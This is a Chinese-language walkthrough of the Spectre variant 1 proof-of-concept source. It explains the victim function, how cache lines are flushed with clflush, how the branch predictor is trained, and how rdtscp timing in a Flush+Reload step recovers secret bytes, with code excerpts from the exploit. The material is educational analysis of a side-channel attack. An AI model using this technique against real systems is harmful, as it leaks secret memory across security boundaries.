# 源码分析

## victim function

首先注意到`array1_size`的属性是`unsigned int`(32 bit)，`array1`和`array2`的属性是`uint8_t`，执行分支预测的代码如下：

```cpp
if (x < array1_size)
{
    temp &= array2[array1[x] * 512];
}
```

在取array2中的元素时，index之间的间隔至少512，说明address之间的间隔至少512 \* 8 = 4096 bytes。

## training

首先回忆若干个数据在cache中的存储方式：

1. array2不在cache（Flush+Reload）；
2. array1_size不在cache（方便在判断出来之前进行推测性执行）；
3. array1[x]在cache（方便尽早执行推测性执行的指令，以免在判断结果出来之后被flush掉）。

所以代码首先要从cache中去除/上载相应的数据：

```cpp
for (i = 0; i < 256; i++)
{
    _mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
}

for (j = 29; j >= 0; j--)
{
#ifndef NOCLFLUSH
    _mm_clflush(&array1_size);
    ...
}
```

循环架构如下：
```cpp
for (tries = 999; tries > 0; tries--)
{
    training_x = tries % array1_size; // array1_size = 16
    for (j = 29; j >= 0; j--)
    {
        /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
        // ...
        victim_function(x); // malicious_x from param
    }
}
```

执行时，每训练5次，恶意执行1次。可以看到，training_x的取值范围是[0, 15]，而malicious_x的值时秘密字符串的地址。显然在训练时，分支都会被预测为`x < array1_size`，之后使用malicious_x时，分支仍然按照训练时的预测结果执行。

随后就是测量，已确定哪一个malicious_x值被取用：

```cpp
time1 = __rdtscp(&junk);         /* READ TIMER */
junk = *addr;                    /* MEMORY ACCESS TO TIME */
time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
```
返回值是当前处理器的ticks。随后如果时间小于一定阈值，就认为击中cache，对应的malicious_x值会增加分数：

```cpp
if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
{
    results[mix_i]++; /* cache hit - add + 1 to score for this value */
}
```

> 这里访问的顺序有讲究：`mix_i = ((i * 167) + 13) & 255;`，见代码：[code example](https://godbolt.org/z/6axfK6j9c)，为了防止所谓的“stride prediction”。


